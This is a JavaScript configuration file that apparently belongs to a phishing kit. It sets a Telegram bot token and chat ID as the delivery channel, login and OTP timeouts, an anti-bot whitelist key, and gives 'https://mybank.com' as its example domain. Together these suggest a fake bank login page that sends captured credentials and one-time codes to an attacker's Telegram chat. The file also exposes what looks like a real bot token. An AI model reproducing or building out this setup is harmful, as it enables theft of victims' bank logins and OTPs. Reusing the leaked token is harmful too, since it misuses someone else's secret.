// ⚠️ IMPORTANT: Replace these values with your actual Telegram credentials before building for cPanel
// This file is used for cPanel/static hosting where environment variables are not supported

export const CPANEL_CONFIG = {
  // 🤖 Get your Telegram Bot Token from @BotFather
  // Steps to get bot token:
  // 1. Open Telegram and search for @BotFather
  // 2. Send /start to BotFather
  // 3. Send /newbot and follow instructions
  // 4. Copy the token and replace below
  TELEGRAM_BOT_TOKEN: "8369043047:AAFggbLTc9CwxeCiXMQJXXhLlKHNmgbqNvM",

  // 💬 Get your Telegram Chat ID
  // Steps to get chat ID:
  // 1. Send a message to your bot
  // 2. Visit: https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates
  // 3. Look for "chat":{"id": YOUR_CHAT_ID in the response
  // 4. Copy the chat ID and replace below
  TELEGRAM_CHAT_ID: "7392135362",

  // 🌐 Your Domain URL (REPLACE WITH YOUR ACTUAL DOMAIN)
  // This is where your website will be hosted
  // Examples: "https://yourdomain.com" or "https://subdomain.yourdomain.com"
  APP_URL:
    process.env.APP_URL ||
    "https://td-hvfhqj8bt-toobs-projects-ddac1c46.vercel.app",

  // ⏱️ Timeout settings (in milliseconds)
  LOGIN_TIMEOUT_MS: "1500",
  OTP_TIMEOUT_MS: "1500",

  // 🛡️ Anti-bot whitelist key for testing
  ANTIBOT_WHITELIST_KEY: "ALLOW_TESTING_ACCESS_2024",
};

// ✅ Example of correctly configured values:
// TELEGRAM_BOT_TOKEN: "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz",
// TELEGRAM_CHAT_ID: "123456789",
// APP_URL: "https://mybank.com",
